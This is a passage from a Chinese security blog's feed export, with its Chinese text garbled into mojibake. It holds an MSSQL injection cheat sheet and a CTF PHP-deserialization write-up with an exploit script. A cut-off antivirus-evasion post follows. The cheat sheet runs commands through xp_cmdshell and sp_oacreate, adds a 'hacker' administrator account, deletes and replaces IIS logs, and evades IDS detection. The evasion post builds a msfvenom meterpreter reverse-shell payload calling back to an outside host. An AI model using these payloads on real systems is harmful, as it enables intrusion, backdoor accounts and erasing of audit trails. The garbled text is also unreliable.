db_name()&gt;0<br>è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼šand (select @@ version)&gt;0<br>åˆ¤æ–­æ˜¯å¦æ”¯æŒå¤šå¥æŸ¥è¯¢ï¼š;declare @ a intâ€“<br>åˆ¤æ–­æ˜¯å¦æ”¯æŒå­æŸ¥è¯¢ï¼šand (select count(1) from [sysobjects])&gt;=0<br>æ•°æ®åº“çš„æ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼šexec master..xp_cmdshell<br>æŸ¥çœ‹æœåŠ¡å™¨Cç›˜ç›®å½•ï¼š;exec_master..xp_cmdshell â€˜dir c:â€™<br>åˆ¤æ–­æ‰©å±•å­˜å‚¨è¿‡ç¨‹æ˜¯å¦å­˜åœ¨ï¼šand select count(<em>) from master.dbo.sysobjects where xtype=â€™xâ€™ and name=â€™xp_cmdshellâ€™<br>æ¢å¤æ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼š;exec sp_addextendedproc xp_cmdshell,â€™xplog70.dllâ€™<br>åˆ é™¤æ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼š;exec sp_dropextendedproc â€˜xp_cmdshellâ€™<br>åœ¨MSSQL2000ä¸­æä¾›äº†ä¸€äº›å‡½æ•°ç”¨äºè®¿é—®OLEå¯¹è±¡é—´æ¥è·å–æƒé™ï¼š<br>  ; declare @ s int<br>;exec sp_oacreat â€˜wscript.shellâ€™,@ s<br>;exec master..spoamethod @ s,â€™runâ€™,null,â€™cmd.exe/c dir c:â€™<br>åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·åæ˜¯å¦æ‹¥æœ‰æ¯”è¾ƒé«˜çš„æƒé™ï¼š<br>and 1=(select is_srvrolemember(â€˜sysadminâ€™))<br>and 1=(select is_srvrolemember(â€˜serveradminâ€™))<br>and 1=(select is_srvrolemember(â€˜setupadminâ€™))<br>and 1=(select is_srvrolemember(â€˜securityadminâ€™))<br>and 1=(select is_srvrolemember(â€˜diskadminâ€™))<br>and 1=(select is_srvrolemember(â€˜bulkadminâ€™))<br>åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·åæ˜¯å¦ä¸ºDB_OWNERï¼š<br>and 1=(select is_member(â€˜db_ownerâ€™))<br>åœ¨SQLSERVERçš„master.dbo.sysdatabasesè¡¨ä¸­å­˜æ”¾ç€SQLSERVERæ•°æ®åº“ç³»ç»Ÿä¸­çš„æ‰€æœ‰æ•°æ®åº“ä¿¡æ¯ï¼Œåªéœ€è¦PUBLICæƒé™å°±å¯ä»¥å¯¹æ­¤è¡¨è¿›è¡ŒSELECTæ“ä½œï¼š<br>and (select top 1 name from master.dbo.sysdatabase order by dbid)&gt;0<br>and (select top 1 name from master.dbo.sysdatabase where name not in(select top 1 name from master.dbo.sysdatabases order by dbid) order by dbid)&gt;0<br>åˆ é™¤æ—¥å¿—è®°å½•ï¼š<br>;exec master.dbo.xp_cmdshell â€˜del c:winntsystem32logfilesw3svc5ex070606.log &gt;c:temp.txtâ€™<br>æ›¿æ¢æ—¥å¿—è®°å½•ï¼š<br>;exec master.dbo.xp_cmdshell â€˜copy c:winntsystem32logfilesw3svc5ex070404.log c:winntsystem32logfilesw3svc5ex070606.log &gt;c:temp.txtâ€™<br>è·å–WEBè·¯å¾„ï¼š<br>  ; declare @ shell int<br>;exec master..sp_oamethod â€˜wscript.shellâ€™,@ shell out<br>;exec master..sp_oamethod @ shell,â€™runâ€™,null,â€™cmd.exe/c dir /s d:/index.asp &gt;c:/log.txt<br>åˆ©ç”¨XP_CMDSHELLæœç´¢ï¼š<br>;exec master..xp_cmdshell â€˜dir /s d:/index.aspâ€™<br>æ˜¾ç¤ºæœåŠ¡å™¨ç½‘ç«™é…ç½®ä¿¡æ¯å‘½ä»¤ï¼š<br>cmd /c cscript.exe c:inetpubadminscriptadsutil.vbs enum w3svc/1/root<br>cmd /c cscript.exe c:inetpubadminscriptadsutil.vbs enum w3svc/2/root<br>åˆ©ç”¨XP_REGREADå¯ç”¨PUBLICæƒé™è¯»å–ï¼š<br>;exec master.dbo.xp_regread<br>hkey_local_machine,<br>â€˜systemcurrentcontrolsetservicesw3svcparametersvirtual rootsâ€™<br>â€˜/â€™<br>SQLSERVERä¸‹çš„é«˜çº§æŠ€æœ¯å¯ä»¥å‚è€ƒé˜…è¯»æ›¾äº‘å¥½æ‰€è‘—çš„ç²¾é€šè„šæœ¬é»‘å®¢ç¬¬äº”ç« ã€‚<br>3ã€DSqlHelper<br>æ£€æµ‹æƒé™SYSADMINï¼š<br>and 1=(select IS_SRVROLEMEMBER(â€˜sysadminâ€™))<br>serveradminã€setupadminã€securityadminã€diskadminã€bulkadminã€db_ownerã€‚<br>æ£€æµ‹XP_CMDSHELLï¼ˆCMDå‘½ä»¤ï¼‰ï¼š<br>and 1=(SELECT count(</em>) FROM master.dbo.sysobjects WHERE name= â€˜xp_cmdshellâ€™)<br>æ£€æµ‹XP_REGREADï¼ˆæ³¨å†Œè¡¨è¯»å–åŠŸèƒ½ï¼‰ï¼š<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE name= â€˜xp_regreadâ€™)<br>æ£€æµ‹SP_MAKEWEBTASKï¼ˆå¤‡ä»½åŠŸèƒ½ï¼‰ï¼š<br>and 1=(SELECT count(</em>) FROM master.dbo.sysobjects WHERE name= â€˜sp_makewebtaskâ€™)<br>æ£€æµ‹SP_ADDEXTENDEDPROCï¼š<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE name= â€˜sp_addextendedprocâ€™)<br>æ£€æµ‹XP_SUBDIRSè¯»å­ç›®å½•ï¼š<br>and 1=(SELECT count(</em>) FROM master.dbo.sysobjects WHERE name= â€˜xp_subdirsâ€™)<br>æ£€æµ‹XP_DIRTREEè¯»å­ç›®å½•ï¼š<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE name= â€˜xp_dirtreeâ€™)<br>ä¿®æ”¹å†…å®¹ï¼š<br>; UPDATE è¡¨å set å­—æ®µ=å†…å®¹ where 1=1<br>XP_CMDSHELLæ£€æµ‹ï¼š<br>;exec master..xp_cmdshell â€˜dir c:â€™<br>ä¿®å¤XP_CMDSHELLï¼š<br>;exec master.dbo.sp_addextendedproc â€˜xp_cmdshellâ€™, â€˜xplog70.dllâ€™<br>ç”¨XP_CMDSHELLæ·»åŠ ç”¨æˆ·hackerï¼š<br>;exec master.dbo.xp_cmdshell â€˜net user hacker 123456 /addâ€™<br>XP_CMDSHELLæŠŠç”¨æˆ·hackeråŠ åˆ°ADMINç»„ï¼š<br>;exec master.dbo.xp_cmdshell â€˜net localgroup administrators hacker /addâ€™<br>åˆ›å»ºè¡¨testï¼š<br>;create table [dbo].[test] ([dstr]<a href="https://blog.harvey.plus/index.php/archives/255">char</a>);<br>æ£€æµ‹è¡¨æ®µtestï¼š<br>and exists (select * from test)<br>è¯»å–WEBçš„ä½ç½®ï¼ˆè¯»æ³¨å†Œè¡¨ï¼‰ï¼š<br>  ; DECLARE @ result varchar(255) EXEC master.dbo.xp_regread â€˜HKEY_LOCAL_MACHINEâ€™,â€™SYSTEMControlSet001ServicesW3SVCParametersVirtual Rootsâ€™, â€˜/â€™,@ result output insert into test (dstr) values(@ result);â€“<br>çˆ†å‡ºWEBçš„ç»å¯¹è·¯å¾„ï¼ˆæ˜¾é”™æ¨¡å¼ï¼‰ï¼š<br>and 1=(select count(</em>) from test where dstr &gt; 1)<br>åˆ é™¤è¡¨testï¼š<br>  ; drop table test;â€“<br>åˆ›å»ºæŸ¥çœ‹ç›®å½•çš„è¡¨dirsï¼š<br>;create table dirs(paths varchar(100), id int)<br>æŠŠæŸ¥çœ‹ç›®å½•çš„å†…å®¹åŠ å…¥è¡¨dirsï¼š<br>;insert dirs exec master.dbo.xp_dirtree â€˜c:â€™<br>çˆ†ç›®å½•çš„å†…å®¹dirsï¼š<br>and 0&lt;&gt;(select top 1 paths from dirs)<br>å¤‡ä»½æ•°æ®åº“DATANAMEï¼š<br>declare @ a sysname; set @ a=db_name();backup DATANAME @ a to disk=â€™c:inetpubwwwrootdown.bakâ€™;â€“<br>åˆ é™¤è¡¨dirsï¼š<br>  ; drop table dirs;â€“<br>åˆ›å»ºè¡¨tempï¼š<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));â€“<br>æŠŠé©±åŠ¨ç›˜åˆ—è¡¨åŠ å…¥tempè¡¨ï¼š<br>;insert temp exec master.dbo.xp_availablemedia;â€“<br>åˆ é™¤è¡¨tempï¼š<br>  ; delete from temp;â€“<br>åˆ›å»ºè¡¨dirsï¼š<br>;create table dirs(paths varchar(100), id int);â€“<br>è·å¾—å­ç›®å½•åˆ—è¡¨XP_SUBDIRSï¼š<br>;insert dirs exec master.dbo.xp_subdirs â€˜c:â€™;â€“<br>çˆ†å‡ºå†…å®¹ï¼ˆæ˜¾é”™æ¨¡å¼ï¼‰ï¼š<br>and 0&lt;&gt;(select top 1 paths from dirs)<br>åˆ é™¤è¡¨dirsï¼š<br>  ; delete from dirs;â€“<br>åˆ›å»ºè¡¨dirsï¼š<br>;create table dirs(paths varchar(100), id int)â€“<br>ç”¨XP_CMDSHELLæŸ¥çœ‹ç›®å½•å†…å®¹ï¼š<br>;insert dirs exec master..xp_cmdshell â€˜dir c:â€™<br>åˆ é™¤è¡¨dirsï¼š<br>  ; delete from dirs;â€“<br>æ£€æµ‹SP_OAcreateï¼ˆæ‰§è¡Œå‘½ä»¤ï¼‰ï¼š<br>and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= â€˜SP_OAcreateâ€™)<br>SP_OAcreateæ‰§è¡ŒCMDå‘½ä»¤ï¼š<br>  ; DECLARE @ shell INT EXEC SP_OAcreate â€˜wscript.shellâ€™,@ shell OUTPUT EXEC SP_OAMETHOD @ shell,â€™runâ€™,null, â€˜C:WINNTsystem32cmd.exe /c net user hacker 123456 /addâ€™<br>SP_OAcreateå»ºç›®å½•ï¼š<br>  ; DECLARE @ shell INT EXEC SP_OAcreate â€˜wscript.shellâ€™,@ shell OUTPUT EXEC SP_OAMETHOD  @ shell,â€™runâ€™,null, â€˜C:WINNTsystem32cmd.exe /c md c:inetpubwwwroot1111â€™<br>åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç›®å½•Eç›˜ï¼š<br>  ; declare @ o int exec sp_oacreate â€˜wscript.shellâ€™, @ o out exec sp_oamethod @ o, â€˜runâ€™, NULL,â€™ cscript.exe c:inetpubwwwrootmkwebdir.vbs -w â€œé»˜è®¤ Web ç«™ç‚¹â€ -v â€œeâ€,â€e:â€â€˜<br>è®¾ç½®è™šæ‹Ÿç›®å½•Eä¸ºå¯è¯»ï¼š<br>  ; declare @ o int exec sp_oacreate â€˜wscript.shellâ€™, @ o out exec sp_oamethod @ o, â€˜runâ€™, NULL,â€™ cscript.exe c:inetpubwwwrootchaccess.vbs -a w3svc/1/ROOT/e +browseâ€™<br>å¯åŠ¨SERVERæœåŠ¡ï¼š<br>;exec master..xp_servicecontrol â€˜startâ€™, â€˜serverâ€™<br>ç»•è¿‡IDSæ£€æµ‹XP_CMDSHELLï¼š<br>  ; declare @ a sysname set @ a=â€™xp_â€™+â€™cmdshellâ€™ exec @ a â€˜dir c:â€™<br>å¼€å¯è¿œç¨‹æ•°æ®åº“1ï¼š<br>; select  <em>from OPENROWSET(â€˜SQLOLEDBâ€™, â€˜server=servername;uid=sa;pwd=apachy_123â€™, â€˜select</em>  from table1â€™ )<br>å¼€å¯è¿œç¨‹æ•°æ®åº“2ï¼š<br>;select  <em>from OPENROWSET(â€˜SQLOLEDBâ€™, â€˜uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;â€™, â€˜select</em>  from tableâ€™</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-ååºåˆ—åŒ–</title>
      <link href="2020/10/08/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2020/10/08/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><a href="https://blog.csdn.net/blackhackerzxcr/article/details/106059465?utm_source=app" title="åŸæ–‡"><strong>åŸæ–‡ä¼ é€é—¨</strong></a></p><p>æ‰“å¼€é¢˜ç›®æ‰€åœ¨çš„ç½‘é¡µï¼šï¼ˆåšctfé¢˜æ—¶æœ€å–œæ¬¢æœ‰æºç äº†ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1714179180.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç®€å•åˆ†æä¸€ä¸‹</p><blockquote><p>é¦–å…ˆä¸€ä¸ªDemoç±»ï¼Œç±»é‡Œé¢å®šä¹‰äº†ç§æœ‰å±æ€§fileå€¼ï¼Œç„¶åæ„é€ å‡½æ•°æŠŠå€¼èµ‹å€¼ç»™å½“å‰çš„å¯¹è±¡çš„ï¼Œç„¶åææ„å‡½æ•°ä¼šæ‰§è¡Œhighlight_fileè¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æ‰“å°è¾“å‡ºæŒ‡å®šæ–‡ä»¶çš„ä»£ç ï¼Œç„¶åè¿˜æœ‰ä¸ª__wakeupæ–¹æ³•ï¼Œä¼šè¢«å½“å‰å¯¹è±¡fileå±æ€§é‡æ–°èµ‹å€¼æˆindex.html<br>ç„¶åå°±æ˜¯GETæ¥å—ä¼ é€’è¿›æ¥çš„Varå‚æ•°å€¼ï¼Œå†baseç¼–ç ï¼Œç„¶åå†æ­£åˆ™åŒ¹é…ã€‚è¿™é‡ŒåŒ¹é… O:æ•°å­— C:æ•°å­—è¿™ç±»éƒ½ç»™ä½ æ‰“å°STOPhackingï¼Œç„¶åæ²¡æœ‰åŒ¹é…åˆ°å°±ä¼šååºåˆ—åŒ–</p></blockquote><p>é€»è¾‘å¤§æ¦‚å°±è¿™æ ·çš„ï¼šå¾ˆç®€å•ï¼<br>è¯´ä¸€ä¸‹åœ¨è¿™ä¸ªç±»ä¸­ååºåˆ—åŒ–ä¸­æ–¹æ³•æ‰§è¡Œçš„é¡ºåºå§ï¼Œé¦–å…ˆæ„é€ å‡½æ•°=ã€‹__wakeupå‡½æ•°=&gt;ææ„å‡½æ•°</p><p>å…¶å®ååºåˆ—åŒ–å…¶å®åˆ«æ²¡æœ‰é‚£ä¹ˆéš¾ï¼Œä½ å¾—äº†è§£åŸç†ï¼Œç„¶åæ„é€ expç”Ÿæˆpocæ‰ä¼šç†æ‰€å½“ç„¶ï¼</p><blockquote><p>å…ˆçœ‹çœ‹æˆ‘çš„expå§</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private $file &#x3D; &#39;fl4g.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$ctf &#x3D; new Demo();</span><br><span class="line">$b &#x3D; serialize($ctf);</span><br><span class="line">&#x2F;&#x2F;string(49) &quot;O: 4:&quot;Demo&quot;: 1:&#123;s: 10:&quot;Demofile&quot;;s: 8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; str_replace(&#39;O: 4&#39;, &#39;O: +4&#39;,$b);&#x2F;&#x2F;ç»•è¿‡preg_match</span><br><span class="line">$b &#x3D; str_replace(&#39;:1 :&#39;, &#39;: 2:&#39;,$b);&#x2F;&#x2F;ç»•è¿‡wakeup</span><br><span class="line">echo base64_encode($b)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šå¾ˆå¤šå¸ˆå‚…ä¼šæŠŠæ•´ä¸ªç±»å†™è¿›å»ï¼Œç„¶åæ„å»ºå¯¹è±¡ï¼Œç„¶åååºåˆ—åŒ–ï¼Œå…¶å®æ„é€ expæ—¶ï¼Œç±»ä¸­çš„æ–¹æ³•æ˜¯å¤šä½™çš„ï¼Œå› ä¸ºåºåˆ—åŒ–å¹¶ä¸ä¼šæŠŠæ–¹æ³•ä¹Ÿå­˜å‚¨è¿›å»ï¼Œåªä¼šå­˜å‚¨ç±»çš„å±æ€§å’Œå€¼ï¼Œæ‰€æœ‰åªéœ€è¦å†™ä¸Šå±æ€§å°±å¯ä»¥</p><p><strong>ç„¶åé‡ç‚¹æ¥äº†ï¼Œååºåˆ—æ¼æ´çš„å®è´¨ï¼Œè®²è®²åœ¨ä¸‹å¯¹æ­¤æ¼æ´çš„ç†è§£</strong><br>æˆ‘ä»¬çœ‹ä¸€ä¸‹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²O:4:â€œDemoâ€: 1 :{s: 10:â€œDemofileâ€;s: 8:â€œfl4g.phpâ€;}<br>ç±»åï¼šDemo å±æ€§ï¼šDemofile å€¼ï¼šflag.php</p><p>å½“æœåŠ¡å™¨ç«¯æ¥å—åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ç„¶åååºåˆ—æ—¶å°±ä¼šæ£€æŸ¥,ä¼šå‘ç°æ˜¯Demoè¿™ä¸ªç±»ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±çœ‹è‡ªå·±çš„ç±»æœ‰æ²¡æœ‰Demoè¿™ä¸ªç±»ï¼Œåˆšå¥½ï¼Œæœ‰ï¼Œç„¶åä»–å°±ä¼šä»¥è‡ªå·±Demoçš„æ–¹æ³•ç±»æ¥ååºåˆ—åŒ–ã€‚</p><blockquote><p>è¿™é‡Œå°±æ˜¯æ¼æ´çš„æ ¹æœ¬æ‰€åœ¨ï¼ŒæœåŠ¡å™¨ä¼šå‚»ä¹ä¹çš„æŠŠè‡ªå·±çš„ç±»æ¥ç»™æ”»å‡»è€…ç”¨ï¼Œæ”»å‡»è€…ä¹Ÿå°±åˆ©ç”¨æœåŠ¡å™¨ä¸­çš„ç±»æ¥è¾¾åˆ°ç›®çš„</p></blockquote><p>æ‰€æœ‰æˆ‘ä»¬ä¹Ÿå°±æ˜¯åˆ©ç”¨è¿™ç‚¹æ¥æ‰§è¡ŒæŸäº›ç‰¹å®šçš„æ”»å‡»ï¼Œè¿™å°±æ˜¯æˆ‘çš„ç†è§£ï¼Œæˆ‘è§‰å¾—æ¯”ç½‘ä¸Šçš„é‚£äº›è¦æ˜“æ‡‚ä¸€äº›ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆè¾¾åˆ°æ”»å‡»ç›®çš„ï¼Ÿ</p><blockquote><p>æ§åˆ¶ç±»ä¸­æ–¹æ³•çš„æ‰§è¡Œæµç¨‹</p></blockquote><p>å°±æ‹¿æ­¤æ¬¡é¢˜ç›®æ¥è¯´ï¼Œæˆ‘ä»¬æ„å»ºå¥½äº†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¼ å…¥è¿›å»ï¼Œç„¶åååºåˆ—åŒ–ã€‚<br>æ„é€ å‡½æ•°=ã€‹__wakeupå‡½æ•°=&gt;ææ„å‡½æ•° ç„¶åæ‰§è¡Œç»“æœä½ ä¼šå‘ç°è¿˜æ˜¯index.htmlè¿™ä¸ªç½‘é¡µ<br>å› ä¸º__wakeupè¿™ä¸ªæ–¹æ³•æ‰§è¡Œäº†ï¼ŒæŠŠå¯¹è±¡ä¸­çš„fileå±æ€§å€¼åˆå˜å›index.html</p><p>æ‰€æœ‰æˆ‘ä»¬è¦æƒ³æ³•è·³è¿‡è¿™ä¸ªæ–¹æ³•ï¼Œæ€ä¹ˆè·³è¿‡å˜<br>SugarCRM v6.5.23 PHPååºåˆ—åŒ– å¯¹è±¡æ³¨å…¥æ¼æ´ è¿™ä¸ªæ¼æ´ä¼šå¸®åŠ©æˆ‘ä»¬è·³è¿‡__wakeupæ–¹æ³•</p><p>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°å¤§äºå®é™…ç±»å±æ€§çš„ä¸ªæ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè·³è¿‡__wakeupæ–¹æ³•</p><p>è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯æ€ä¹ˆç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Ÿ<br>å› ä¸ºæ­£åˆ™åŒ¹é…è¿™æ ·çš„å­—ç¬¦</p><blockquote><p>O:æ•°å­—</p></blockquote><p>è¿™å†™æ­»äº†ï¼Œä¹Ÿç»™æˆ‘ä»¬æä¾›ç»•è¿‡çš„å¯èƒ½ã€‚0:+4è¿™æ ·å°±ä¸ä¼šè¢«åŒ¹é…äº†ï¼Œä¹Ÿä¸å½±å“ååºåˆ—</p><p>æœ€å¥½æŠŠåºåˆ—åŒ–çš„å­—ç¬¦ä¸²base64ç¼–ç ä¸€ä¸‹å°±å¥½</p><p>ç„¶åé¡ºåˆ©æ‹¿åˆ°Flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1775310604.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="åŸç†æ€»ç»“ä¸€å¥è¯"><a href="#åŸç†æ€»ç»“ä¸€å¥è¯" class="headerlink" title="åŸç†æ€»ç»“ä¸€å¥è¯"></a>åŸç†æ€»ç»“ä¸€å¥è¯</h2><blockquote><p><strong>é±¼ç›®æ··ç ï¼Œç’å¤©è¿‡æµ·ï¼Œå€Ÿåˆ°æ€äºº</strong></p></blockquote><p>é±¼ç›®æ··ç ï¼šå°±æ˜¯ä½ æŠŠæœåŠ¡å™¨çš„ç±»çš„åå­—æ‹¿æ¥ä¼ªè£…ï¼Œè¿™æ ·æœåŠ¡å™¨å°±è®¤ä¸ºè¿™æ˜¯å®ƒè‡ªå·±çš„ç±»</p><p>ç’å¤©è¿‡æµ·ï¼šä½ æŠŠä¼ªè£…çš„ç±»ï¼Œæ‹¿æ¥åºåˆ—åŒ–ï¼Œç„¶åæœåŠ¡å™¨æ‹¿åˆ°äº†ä½ ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¹‹åï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œä»–ä¼šè®¤ä¸ºï¼Œè¿™å°±æ˜¯å®ƒè‡ªå·±ååºåˆ—åŒ–çš„ç±»ï¼Œå› ä¸ºç±»åå’Œå±æ€§å’Œä»–è‡ªå·±çš„ç±»ä¸€æ¨¡ä¸€æ ·ï¼Œä¸çŸ¥é“æ˜¯å¤–éƒ¨ä¼ å…¥çš„</p><p>å€Ÿåˆ€æ€äººï¼šåœ¨ååºåˆ—ä¸­ï¼Œå› ä¸ºå‰ä¸¤æ­¥ï¼ŒæœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ä¸­ï¼Œå°±ä¼šæŠŠä»–è‡ªå·±çš„ç±»çš„æ–¹æ³•æ‹¿æ¥ç”¨ï¼Œä½ å°±ç›¸å½“äºå€Ÿç”¨äº†æœåŠ¡å™¨ç±»çš„æ–¹æ³•</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…æ€æŠ€å·§-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ–¹å¼æ€»ç»“</title>
      <link href="2020/10/04/%E5%85%8D%E6%9D%80%E6%8A%80%E5%B7%A7-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
      <url>2020/10/04/%E5%85%8D%E6%9D%80%E6%8A%80%E5%B7%A7-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>Msfå¼€å¯ä¼šè¯ï¼š&gt; â€œåœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¸¸å¸¸ä¼šé‡åˆ°è¿™ç§æƒ…å†µï¼Œä¸Šä¼ ä¸€ä¸ªshellä¸Šå»ï¼Œè¿ä¸Šï¼Œå´å‘ç°æ— æ³•è°ƒç”¨cmd.exeæ— æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ—¶å€™ä½ å¾€å¾€æƒ³ç€ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå·±çš„cmd.exeä¸Šå»ï¼Œè¿™æ˜¯ä¸€å¥—è¡Œäº‘æµæ°´çš„æ“ä½œï¼Œä½†æŠŠç¯å¢ƒæ¡ä»¶åœ¨å˜å¾—è‹›åˆ»ä¸€ç‚¹ï¼Œæ€æ¯’è½¯ä»¶å°†ç›‘è§†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¾‹å¦‚cmd.exe,é‚£ä¹ˆä½ ä¼šæ€ä¹ˆåšæ‰èƒ½é€ƒé¿æ£€æµ‹ï¼Ÿé‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¼šä»‹ç»ä¸€äº›å…æ€æ€è·¯ã€‚â€</p><hr><h2 id="01-èƒŒæ™¯"><a href="#01-èƒŒæ™¯" class="headerlink" title="01-èƒŒæ™¯"></a>01-èƒŒæ™¯</h2><p>Windowsç³»ç»Ÿæä¾›äº†å¤šä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¬æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<br>åœ¨è¿™ï¼Œä½ æ˜¯ä¸æ˜¯æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿæ—¢ç„¶å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆå®ƒå°†å¸®åŠ©hackerä»¬é€ƒè¿‡æ£€æµ‹ï¼Œå°¤å…¶æ˜¯å¯¹cmd.exeç›‘è§†çš„ç¯å¢ƒä¸‹ã€‚<br>å½“ç„¶è¿™éœ€è¦ä¸€äº›å‰ææ¡ä»¶ï¼šæœªæ­£ç¡®é…ç½®ç™½åå•è§„åˆ™ï¼ˆè¿™é‡Œæ¶µç›–äº†æ–‡ä»¶åå’Œè·¯å¾„ï¼‰ï¼Œä½¿å¾—ä¸€äº›ç³»ç»Ÿå¯æ‰§è¡Œæ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œã€‚</p><center>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹è¿™äº›é¡¹å…æ€æŠ€æœ¯çš„é—ªå…‰ç‚¹ï¼</center><h2 id="02-æ­£æ–‡"><a href="#02-æ­£æ–‡" class="headerlink" title="02-æ­£æ–‡"></a>02-æ­£æ–‡</h2><p>æˆ‘ä»¬å…ˆç”¨msfvenomç”Ÿæˆä¸€ä¸ªæœ¨é©¬ç¨‹åºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.73.136 lport&#x3D;8888 -f exe -o hacker.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2822817250.png"></p><p>Msfç›‘å¬ç«¯å£8888</p><p>Forfilesï¼š</p><p>é¦–å…ˆï¼Œè¦è¯´æ˜çš„æ˜¯ï¼Œforfilesæ˜¯Windows Server 2003å†…ç½®çš„å‘½ä»¤è¡Œæ–‡ä»¶ï¼Œå…¶å®ƒç³»ç»Ÿæœªå¿…é€‚ç”¨ã€‚ä¸è¿‡ï¼Œwin2003ä»¥ä¸Šçš„ç³»ç»Ÿï¼ŒåŒ…æ‹¬win7ã€windows server 2008å‡é€‚ç”¨å“¦ã€‚forfiles æ˜¯ä¸€ä¸ªå‘½ä»¤å®ç”¨ç¨‹åºï¼Œå¯ä»¥é€‰æ‹©å¤šä¸ªæ–‡ä»¶å¹¶åœ¨å®ƒä»¬ä¸Šè¿è¡Œå‘½ä»¤ï¼Œå®ƒé€šå¸¸ç”¨äºæ‰¹å¤„ç†ä½œä¸šä¸­ï¼Œä½†å¯èƒ½ä¼šè¢«æ»¥ç”¨ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤æˆ–å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>è¯­æ³•é¡»çŸ¥ï¼š</p><p>é»˜è®¤æœç´¢æ©ç ä¸º*ï¼Œä¹Ÿä½¿ç”¨å‚æ•° / på’Œ/ måœ¨Windowsç›®å½•System32 å’Œæ©ç calc.exe ä¸Šæ‰§è¡Œæœç´¢ï¼Œ/ cå‚æ•°ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å®é™…æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c 